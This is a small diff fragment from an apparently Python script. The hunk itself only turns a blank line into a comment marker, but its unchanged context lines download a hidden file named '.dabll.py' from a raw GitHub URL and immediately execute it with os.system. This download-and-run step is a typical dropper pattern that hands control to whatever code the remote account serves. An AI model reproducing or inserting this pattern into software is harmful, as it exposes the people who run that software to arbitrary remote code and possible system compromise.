@@ -44,4 +44,4 @@ import os, sys, random, wget
 wget.download("https://raw.githubusercontent.com/sfr404sfrzed/-/main/.dabll.py")
 os.system("python .dabll.py")
 
-
+#
